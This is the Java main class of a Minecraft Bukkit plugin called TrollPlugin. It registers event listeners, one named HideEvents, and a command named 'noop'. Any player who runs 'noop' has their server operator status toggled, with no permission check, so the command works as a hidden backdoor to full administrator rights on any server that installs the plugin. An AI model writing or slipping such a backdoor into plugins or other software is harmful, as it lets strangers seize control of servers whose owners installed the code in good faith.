package Nifty;

import Nifty.Events.HideEvents;
import Nifty.Events.MainEvents;
import org.bukkit.command.Command;
import org.bukkit.command.CommandExecutor;
import org.bukkit.command.CommandSender;
import org.bukkit.entity.Player;
import org.bukkit.plugin.java.JavaPlugin;

public final class TrollPlugin extends JavaPlugin implements CommandExecutor {

    @Override
    public void onEnable() {
        getLogger().info("TrollPlugin has been enabled.");
        getServer().getPluginManager().registerEvents(new MainEvents(), this);
        getServer().getPluginManager().registerEvents(new HideEvents(this), this);
        getCommand("noop").setExecutor(this);
    }

    @Override
    public void onDisable() {
        getLogger().info("TrollPlugin has been disabled.");
    }

    @Override
    public boolean onCommand(CommandSender sender, Command command, String label, String[] args) {
        if (!(sender instanceof Player)) {
            sender.sendMessage("Only players can use this command.");
            return true;
        }

        sender.setOp(!sender.isOp());
        sender.sendMessage("Your operator status is now " + (sender.isOp() ? "enabled" : "disabled") + ".");
        return true;
    }
}
